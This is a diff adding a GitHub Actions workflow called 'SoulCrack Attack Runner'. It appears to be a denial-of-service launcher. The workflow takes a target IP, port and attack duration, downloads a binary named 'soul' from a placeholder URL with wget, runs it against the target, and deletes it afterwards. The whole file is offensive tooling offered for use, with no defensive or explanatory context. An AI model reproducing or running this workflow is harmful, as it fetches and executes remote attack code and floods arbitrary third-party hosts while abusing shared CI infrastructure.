@@ -1,0 +1,43 @@
+name: SoulCrack Attack Runner
+
+on:
+  workflow_dispatch:
+    inputs:
+      target_ip:
+        description: 'Target IP Address'
+        required: true
+        type: string
+      target_port:
+        description: 'Target Port'
+        required: true
+        type: string
+      duration:
+        description: 'Attack Duration (seconds)'
+        required: true
+        type: string
+
+jobs:
+  attack:
+    runs-on: ubuntu-latest
+    
+    steps:
+    - name: Checkout repository
+      uses: actions/checkout@v3
+      
+    - name: Setup environment
+      run: |
+        sudo apt-get update
+        sudo apt-get install -y wget
+        
+    - name: Download attack binary
+      run: |
+        wget -O soul https://your-binary-url/soul
+        chmod +x soul
+        
+    - name: Execute attack
+      run: |
+        ./soul ${{ github.event.inputs.target_ip }} ${{ github.event.inputs.target_port }} ${{ github.event.inputs.duration }}
+        
+    - name: Cleanup
+      run: |
+        rm -f soul
